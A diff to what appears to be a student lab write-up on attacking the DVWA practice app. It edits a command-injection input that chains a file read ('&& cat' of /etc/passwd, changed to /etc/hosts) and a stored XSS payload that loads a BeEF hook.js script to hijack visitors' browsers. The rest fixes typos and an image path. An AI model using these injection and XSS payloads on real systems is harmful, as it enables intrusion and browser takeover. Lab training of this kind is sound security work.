@@ -19,7 +19,7 @@ We can use the exact same technique to also use view the /etc/hosts with minimal
 
 Command:
 
-        8.8.8.8 && cat ../../../../../etc/passwd
+        8.8.8.8 && cat ../../../../../etc/hosts
 ![](/HW-15/Images/15-2%20Command%20Injection.png)
 
 Mitigation:
@@ -57,7 +57,8 @@ Mitigation: The first thing that needs to be done is limiting the number of time
 
 <h1>Web Application 3: Cross Site Scripting(XSS)</h1>
 Using the Browser Exploitation Framework (BeEF) to execute cross site scripting exploitation.
-![](/HW-15/Images/15-10%20Beef.png)
+
+![](/HW-15/Images/15-10Beef.png)
 
 First we will try to hook the DVWA with our beef malware in it's XSS.
 
@@ -67,11 +68,11 @@ The command we want to exploit is:
 
         <script src="http://127.0.0.1:3000/hook.js"></script>
 
-By placing that into the message of the book we can book this other browser and exploit.
+By placing that into the message of the book we can hook this other browser and exploit it.
 
 ![](/HW-15/Images/15-12%20Beef.png)
 
-This results in new IP address being added to the beef list of vulnerable browers.
+This results in a new IP address being added to the beef list of vulnerable browsers.
 
 ![](/HW-15/Images/15-13%20Beef.png)
 
